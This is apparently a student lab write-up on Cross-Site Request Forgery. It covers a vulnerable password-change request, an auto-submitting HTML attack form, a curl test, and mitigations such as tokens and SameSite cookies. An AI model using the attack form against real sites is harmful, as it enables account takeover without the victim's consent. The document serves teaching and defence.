# 🔄 Cross-Site Request Forgery (CSRF) – Attack Analysis & Prevention

## Overview
Cross-Site Request Forgery (CSRF) is a web security vulnerability that tricks an authenticated user into unknowingly executing unwanted actions on a trusted web application. The attack abuses the **implicit trust a website places in a user's browser**.

This document explains CSRF concepts, attack simulation, detection, and mitigation for academic and practical learning.

---

## 🎯 Objective
- To understand how CSRF attacks work
- To simulate a CSRF attack in a controlled environment
- To identify insecure application behavior
- To document secure coding practices to prevent CSRF

---

## 🧪 Attack Prerequisites
- Victim must be **logged into the target application**
- Application must rely only on **cookies for authentication**
- No CSRF tokens or request validation present

---

## ⚠️ CSRF Attack Simulation

### Scenario
A vulnerable web application allows users to change their password via a POST request **without CSRF protection**.

---

### 🔹 Vulnerable Request Example
```http
POST /change_password.php HTTP/1.1
Host: target.com
Cookie: PHPSESSID=abc123

new_password=hacked123
```

---

### 🔹 Malicious CSRF Payload (HTML)
```html
<form action="http://target.com/change_password.php" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="submit">
</form>

<script>
  document.forms[0].submit();
</script>
```

📌 **Explanation**
- Victim opens attacker-controlled page
- Browser automatically sends cookies
- Password is changed without user consent

---

## 🧪 CSRF Testing Using Bash (Simulation)

```bash
curl -X POST http://target.com/change_password.php      -H "Cookie: PHPSESSID=abc123"      -d "new_password=hacked123"
```

📌 **Insight**
If this request succeeds without additional validation, the application is vulnerable to CSRF.

---

## 📊 Impact of CSRF Attacks
- Unauthorized password changes
- Account takeover
- Unauthorized fund transfers
- Profile modification
- Privilege abuse

---

## 🛡️ Mitigation & Prevention

### ✅ 1️⃣ CSRF Tokens (Recommended)
```php
<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['token']; ?>">
```

✔ Token validated on every request  
✔ Unique per session/request  

---

### ✅ 2️⃣ SameSite Cookie Attribute
```http
Set-Cookie: PHPSESSID=abc123; SameSite=Strict
```

---

### ✅ 3️⃣ Verify HTTP Headers
- Check `Origin`
- Check `Referer`

---

### ✅ 4️⃣ Re-authentication for Sensitive Actions
- Password change
- Payment
- Account deletion

---

## 📸 Screenshots & Evidence (Practical Submission)

### Screenshot 1: Vulnerable Form
```
[ Screenshot: Password Change Form ]
```

### Screenshot 2: Crafted CSRF Payload
```
[ Screenshot: CSRF HTML Page ]
```

### Screenshot 3: Successful Unauthorized Action
```
[ Screenshot: Password Changed Without Consent ]
```

### Screenshot 4: Mitigation Applied (CSRF Token)
```
[ Screenshot: CSRF Token Validation ]
```

---

## 📌 Key Takeaways
- CSRF exploits **user trust**, not application bugs
- Cookies alone are insufficient protection
- CSRF tokens are mandatory for modern web apps
- SameSite cookies significantly reduce attack surface

---

## 📚 Conclusion
Cross-Site Request Forgery is a silent but dangerous vulnerability that can lead to serious security incidents. Proper implementation of CSRF defenses such as tokens, header validation, and secure cookie attributes effectively mitigates this risk.

---

## 👤 Author
Cybersecurity Lab Project  
CSRF Attack Analysis & Prevention
